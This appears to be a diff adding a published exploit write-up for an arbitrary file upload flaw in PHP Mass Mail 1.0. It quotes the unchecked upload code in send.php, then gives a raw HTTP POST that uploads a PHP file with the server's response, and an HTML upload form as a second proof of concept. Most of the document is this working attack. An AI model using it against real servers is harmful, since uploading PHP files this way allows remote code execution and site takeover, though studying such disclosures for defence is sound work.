@@ -1,0 +1,69 @@
+# Exploit Title: PHP Mass Mail 1.0 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-11-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://phpmassmail.sourceforge.io/
+# Software Link: https://netix.dl.sourceforge.net/project/phpmassmail/phpmassmail/1.0.0/phpmassmail.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/send.php
+# 
+# http://localhost/[PATH]/upload/[FILE]
+
+# ....
+#07 require("class.phpmailer.php");
+#08 
+#09 $uploaddir = 'upload';
+#10 $key = 0;
+#11 $tmp_name = $_FILES["userfile"]["tmp_name"][$key];
+#12         $name = $_FILES["userfile"]["name"][$key];
+#13         $sendfile = "$uploaddir/$name";
+#14 move_uploaded_file($tmp_name, $sendfile);
+# ....
+
+POST /[PATH]/send.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/octet-stream
+Content-Length: 716
+Cookie: PHPSESSID=dhq0fbvco8d0sc0lem3l2kktk0
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------265001916915724: undefined
+Content-Disposition: form-data; name="userfile[]"; filename="phpinfo.php"
+<?php
+phpinfo();
+?>
+-----------------------------265001916915724--
+HTTP/1.1 200 OK
+Date: Wed, 14 Nov 2018 19:27:39 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 719
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/send.php
+# 
+# http://localhost/[PATH]/upload/[FILE]
+# 
+<html>
+<body>
+<form method="post" action="send.php" enctype="multipart/form-data">
+<input name="userfile[]" type="file">
+<input value="Send mail" type="submit">
+</form>
+</body>
+</html>
